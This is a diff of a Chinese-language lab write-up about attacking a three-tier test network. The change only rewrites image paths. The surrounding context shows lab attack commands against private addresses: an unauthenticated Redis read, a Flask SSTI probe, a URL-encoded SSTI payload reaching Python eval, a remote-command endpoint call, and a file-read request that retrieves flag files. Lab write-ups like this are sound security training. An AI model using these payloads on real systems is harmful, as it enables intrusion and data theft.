@@ -14,19 +14,19 @@ It details multiple methods to extract the internal host flag, including Flask S
 
 通过SSH直接登入代理机，验证证明该漏洞有效：
 
-![image-20251127141822414](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251127141822414.png)
+![image-20251127141822414](../images/image-20251127141822414.png)
 
 #### 漏洞2——Redis弱口令漏洞
 
 攻击者无需密码即可以进入Redis，证明该漏洞有效：
 
-![image-20251127145421736](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251127145421736.png)
+![image-20251127145421736](../images/image-20251127145421736.png)
 
 #### 漏洞3——Flask SSTI漏洞
 
 我们在虚拟机上curl该漏洞所在端口看是不是有响应，证明该漏洞有效：
 
-![image-20251127170229827](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251127170229827.png)
+![image-20251127170229827](../images/image-20251127170229827.png)
 
 ### 获取flag——攻击机攻入内网机
 
@@ -42,7 +42,7 @@ It details multiple methods to extract the internal host flag, including Flask S
 ssh student@192.168.2.10 "cat /home/student/proxy_flag.txt"
 ```
 
-![image-20251128140827479](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128140827479.png)
+![image-20251128140827479](../images/image-20251128140827479.png)
 
 ##### 通过Redis存储和获取flag
 
@@ -52,7 +52,7 @@ ssh student@192.168.2.10 "cat /home/student/proxy_flag.txt"
 redis-cli -h 127.0.0.1 get proxy_flag  
 ```
 
-![image-20251128141232522](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128141232522.png)
+![image-20251128141232522](../images/image-20251128141232522.png)
 
 我主要使用了指令：
 
@@ -68,7 +68,7 @@ cat /home/student/proxy_flag.txt | redis-cli -h 127.0.0.1 -x set proxy_flag
 curl -X POST -d "name=%7B%7B7*7%7D%7D" http://192.168.2.10:8080/ssti
 ```
 
-![image-20251128132046671](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128132046671.png)
+![image-20251128132046671](../images/image-20251128132046671.png)
 
 我们可以通过RCE端点尝试：
 
@@ -90,7 +90,7 @@ RCE即远程代码执行，攻击者能够在目标系统上远程执行任意�
 curl "http://192.168.2.10:8080/rce?cmd=cat%20/home/kali/vuln_flask/flag.txt"
 ```
 
-![image-20251128141530878](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128141530878.png)
+![image-20251128141530878](../images/image-20251128141530878.png)
 
 还可以通过文件读取：
 
@@ -98,7 +98,7 @@ curl "http://192.168.2.10:8080/rce?cmd=cat%20/home/kali/vuln_flask/flag.txt"
 curl "http://192.168.2.10:8080/read?file=/home/kali/vuln_flask/flag.txt"
 ```
 
-![image-20251128141800987](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128141800987.png)
+![image-20251128141800987](../images/image-20251128141800987.png)
 
 也可以尝试SSTI端点获取：
 
@@ -108,7 +108,7 @@ curl -X POST -d "name=%7B%7Burl_for.__globals__.__builtins__%5B%27eval%27%5D%28%
  is sb</h1>
 ```
 
-![image-20251128132127132](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128132127132.png)
+![image-20251128132127132](../images/image-20251128132127132.png)
 
 前面几个求flag都好说，我主要想聊聊最后一个通过SSTI获取的这个方法，我为了配出来正确的payload真的是和ai疯狂调试，还是对这个漏洞感觉挺神奇的吧，就把这个漏洞的相关解释部分放这里了：
 
@@ -134,7 +134,7 @@ print(decoded)
 
 运行结果如下：
 
-![image-20251128143242842](D:\LJY\Github\Three-Tier-Network-Attack-Lab\images\image-20251128143242842.png)
+![image-20251128143242842](../images/image-20251128143242842.png)
 
 经过URL解码，我的payload变成了：
 
